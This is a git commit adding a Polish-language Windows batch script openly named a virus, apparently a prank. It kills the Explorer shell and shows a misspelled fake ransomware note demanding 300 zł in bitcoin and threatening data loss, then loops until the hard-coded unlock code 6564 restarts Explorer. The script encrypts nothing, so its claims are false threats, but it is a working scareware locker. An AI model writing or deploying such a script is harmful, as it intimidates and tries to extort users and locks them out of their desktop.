a27199675453afa5c736892263a553d20fbf33c9
Kundel8392 <magda.orzol82@gmail.com>
2024-09-14 15:57:48 +0200

    Create Virus Guwno_4617Descrypt.bat

---
+++ Virus Guwno_4617Descrypt.bat
@@ -0,0 +1,25 @@
+@echo off
+taskkill /f /im explorer.exe
+cls
+echo twuj komputer zostal zaszyfrowany przez Guwno_4617Descrypt
+echo rzeby go odblokowac musisz zebrac 100 punktuw guwno
+echo mozes je zebrac placonc 300 zl pod adres bidcoin Guwno4617Descrypt801129.phg                                            Twoje pukty guwno:20
+echo za 3 dni twuj system straci dysk i dane:(
+echo Twuj czas: 2-23-52-16
+echo twoje punkty guwno mozes zebrac tez za darmo +5 piszonc pod ten adres bidcoin mile slowa:)
+set code=""
+
+:code
+set /p code="Wpisz kod z punktuw guwno:"
+if "%code%"=="6564" goto correct
+if NOT "%code%"=="6564" goto wrong
+
+:correct
+start explorer
+echo Kod jest dobry dzienkuje;)
+pause
+exit
+
+:wrong
+echo Kod jest niepotwierdzony przez administwatora ********************.IT
+goto code
